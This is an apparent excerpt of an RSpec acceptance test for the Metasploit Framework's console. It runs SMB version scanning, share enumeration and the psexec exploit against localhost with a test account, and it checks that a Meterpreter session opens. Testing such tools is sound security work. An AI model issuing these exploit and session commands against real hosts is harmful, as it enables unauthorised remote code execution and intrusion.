...
class ChildProcess
  ...
  def with_countdown(timeout)
    ...
    if countdown.elapsed?
      ...
      raise "Failed await result, bailing with remaining buffer #{buffer.string[buffer.pos..-1].inspect}" if ENV['CI']
      if !ENV['CI']
...
def test_available_commands?(payload_config)
  payload_config[:test_available_commands] && supported_platform?(payload_config)
end
...
RSpec.describe 'payloads' do
  ...
  describe "smb" do
    ...
    it "detects smb versions" do
      console.sendline("use auxiliary/scanner/smb/smb_version")
      console.recvuntil(Console.prompt)

      console.sendline("run smb://127.0.0.1")
      result = console.recvuntil(Console.prompt)

      expect(result).to include "SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1)"
    end

    it "supports smb enumeration" do
      console.sendline("use auxiliary/scanner/smb/smb_enumshares")
      console.recvuntil(Console.prompt)

      console.sendline("run smb://TestingAccount:password@127.0.0.1")
      result = console.recvuntil(Console.prompt)

      expect(result).to include 'ADMIN$ - (DISK|SPECIAL) Remote Admin'
      expect(result).to include 'IPC$ - (IPC|SPECIAL) Remote IPC'
    end

    it "supports psexec" do
      console.sendline("use exploit/windows/smb/psexec")
      console.recvuntil(Console.prompt)

      console.sendline("options")
      console.recvuntil(Console.prompt)

      console.sendline("run smb://TestingAccount:password@127.0.0.1 lhost=127.0.0.1 -j")
      ...
      console.sendline("sessions -i #{session_id} -C sysinfo")
      session_info = console.recvuntil(Console.prompt, timeout: 60)

      expect(session_info).to include('Meterpreter     : x86/windows')
    end
  end
  ...
  #           it 'exposes available metasploit commands', if: run_meterpreter?(meterpreter_config) && test_available_commands?(payload_config) && ENV['CI'] do
